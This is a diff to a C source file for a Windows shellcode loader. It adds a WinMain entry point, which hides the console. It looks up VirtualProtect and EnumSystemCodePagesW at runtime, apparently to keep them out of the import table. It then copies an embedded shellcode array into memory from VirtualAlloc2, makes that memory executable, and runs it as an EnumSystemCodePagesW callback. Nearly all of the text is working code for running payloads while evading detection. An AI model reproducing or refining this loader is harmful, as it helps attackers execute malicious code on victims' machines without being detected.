@@ -35,21 +35,49 @@ unsigned char shellcode[] =
 "\x4C\x4C\x00\x49\x8B\xCC\x41\xFF\xD7\x49\x8B\xCC\x48\x8B\xD6"
 "\xE9\x14\xFF\xFF\xFF\x48\x03\xC3\x48\x83\xC4\x28\xC3";
 
-int main()
+typedef PVOID (WINAPI* pfnVirtualAlloc2)(
+    IN OPTIONAL      HANDLE                 Process,
+    IN OPTIONAL      PVOID                  BaseAddress,
+    IN                SIZE_T                 Size,
+    IN                ULONG                  AllocationType,
+    IN                ULONG                  PageProtection,
+    IN OUT OPTIONAL MEM_EXTENDED_PARAMETER* ExtendedParameters,
+    IN                ULONG                  ParameterCount
+);
+
+typedef BOOL (WINAPI* pfnVirtualProtect)(
+    IN  LPVOID lpAddress,
+    IN  SIZE_T dwSize,
+    IN  DWORD  flNewProtect,
+    OUT PDWORD lpflOldProtect
+);
+
+typedef BOOL (WINAPI* pfnEnumSystemCodePagesW)(
+    IN CODEPAGE_ENUMPROCW lpCodePageEnumProc,
+    IN DWORD              dwFlags
+);
+
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR lpCmdLine, INT nCmdShow)
+//int main() 
 {
+
+    pfnVirtualProtect pVirtualProtect = (pfnVirtualProtect)GetProcAddress(GetModuleHandleW(L"kernel32.dll"), "VirtualProtect");
+    pfnEnumSystemCodePagesW pEnumSystemCodePagesW = (pfnEnumSystemCodePagesW)GetProcAddress(GetModuleHandleW(L"kernel32.dll"), "EnumSystemCodePagesW");
+    
     SIZE_T scSize = sizeof(shellcode);
 
     HANDLE cProcess = GetCurrentProcess();
 
     PVOID memPointer = VirtualAlloc2(NULL, NULL, scSize, (MEM_COMMIT | MEM_RESERVE), PAGE_READWRITE, NULL, 0);
     if (memPointer == 0) { return -2; }
-    printf("Pointer: %p", memPointer);
+    //printf("Pointer: %p\n", memPointer);
 
-    memmove(memPointer, shellcode, scSize);
+
+    memmove_s(memPointer, scSize, shellcode, scSize);
 
     DWORD oldprotect;
-    VirtualProtect(memPointer, scSize, PAGE_EXECUTE, &oldprotect);
-    if (!EnumSystemCodePagesW((CODEPAGE_ENUMPROCW)memPointer, 0)) { return -2; }
+    pVirtualProtect(memPointer, scSize, PAGE_EXECUTE, &oldprotect);
+    if (!pEnumSystemCodePagesW((CODEPAGE_ENUMPROCW)memPointer, 0)) { return -2; }
     return 0;
 
 }
